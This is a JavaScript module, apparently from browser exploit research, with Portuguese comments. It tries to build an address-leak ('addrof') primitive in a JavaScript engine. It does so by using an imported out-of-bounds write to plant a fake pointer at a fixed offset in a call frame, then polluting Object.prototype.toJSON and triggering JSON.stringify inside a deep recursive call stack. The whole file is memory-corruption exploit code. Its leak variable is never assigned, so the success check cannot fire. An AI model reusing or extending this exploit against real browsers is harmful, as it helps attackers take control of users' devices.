// js/script3/testMemoryLeakViaJsonTC.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { toHex, AdvancedInt64 } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

// --- Configuração para Exploit de Corrupção de CallFrame ---
const CF_CORRUPT_CONFIG = {
    CRASH_OFFSET: 0x70,
    FAKE_POINTER_TO_OBJECT: new AdvancedInt64("0x0108230700001337"),
};
// --- Fim dos Parâmetros ---

let leaked_address = null;
function build_stack_and_trigger(depth, victim_obj) {
    if (depth <= 0) {
        try {
            JSON.stringify(victim_obj);
        } catch(e) {
            logS3(`ERRO DENTRO DA PILHA DE CHAMADAS: ${e.message}`, "warn", "build_stack_and_trigger");
        }
        return;
    }
    build_stack_and_trigger(depth - 1, victim_obj);
}

export async function testAddrofPrimitive() {
    const FNAME = "testAddrofPrimitive";
    logS3(`--- Iniciando Tentativa de Leak via Corrupção de CallFrame ---`, "test", FNAME);
    logS3(`   Usando StructureID (placeholder) para Float64Array: ${CF_CORRUPT_CONFIG.FAKE_POINTER_TO_OBJECT.toString()}`, "info", FNAME);

    await triggerOOB_primitive();

    const victim = {};
    const ppKey = 'toJSON';

    Object.defineProperty(Object.prototype, ppKey, {
        value: function() {
            logS3(`[${ppKey} Poluído] Chamado! 'this' é do tipo: ${Object.prototype.toString.call(this)}`, "info", FNAME);
            return { executed: true };
        },
        writable: true, configurable: true, enumerable: false
    });

    logS3(`Corrompendo offset ${toHex(CF_CORRUPT_CONFIG.CRASH_OFFSET)} com ponteiro falso ${CF_CORRUPT_CONFIG.FAKE_POINTER_TO_OBJECT.toString()}`, "warn", FNAME);
    try {
        oob_write_absolute(CF_CORRUPT_CONFIG.CRASH_OFFSET, CF_CORRUPT_CONFIG.FAKE_POINTER_TO_OBJECT, 8);
    } catch (e) {
        logS3(`Falha ao escrever OOB: ${e.message}`, "error", FNAME);
        clearOOBEnvironment();
        return;
    }
    
    await PAUSE_S3(100);

    logS3("Construindo pilha de chamadas para posicionar CallFrames na memória e acionando JSON.stringify...", "info", FNAME);
    build_stack_and_trigger(20, victim);

    delete Object.prototype[ppKey];
    clearOOBEnvironment();
    
    if (leaked_address) {
         logS3(`--- SUCESSO! Endereço vazado: ${toHex(leaked_address)} ---`, "vuln", FNAME);
    } else {
         logS3("--- Teste concluído. Nenhum vazamento óbvio, mas verifique o console por erros ou comportamento inesperado. ---`, "warn", FNAME);
    }
}
